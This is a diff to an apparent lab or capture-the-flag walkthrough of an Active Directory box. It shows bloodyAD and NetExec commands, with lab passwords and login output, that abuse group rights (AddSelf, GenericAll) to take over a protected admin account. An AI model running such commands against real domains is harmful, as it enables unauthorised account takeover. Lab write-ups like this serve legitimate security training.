@@ -602,7 +602,7 @@ Looks like i have AddSelf on a group called `adminaccs`
 
 And this group has GenericAll on the `shareadmin`
 
-# Adding `d.goggins` to `adminaccs` group
+# Adding `d.goggins` to `adminaccs` group and compromising `shared`
 
 ```python
 bloodyAD --host dc01.fragments.local -d fragments.local -u d.goggins -p 'HiO5n449W36!' add groupMember 'adminaccs' 'd.goggins' 
@@ -622,6 +622,12 @@ This has now changed the password of the user!
 > In the real world this isnt something you would do unless given explicit permission!
 
 Now remember this user sharedadmin is in protected users so ill have to authenticate with kerberos!
+
+```python
+nxc smb dc01.fragments.local -u sharedadmin -p 'Password123!' --smb-timeout 5 -k
+SMB         dc01.fragments.local 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.fragments.local 445    DC01             [+] fragments.local\sharedadmin:Password123!
+```
 
 
 
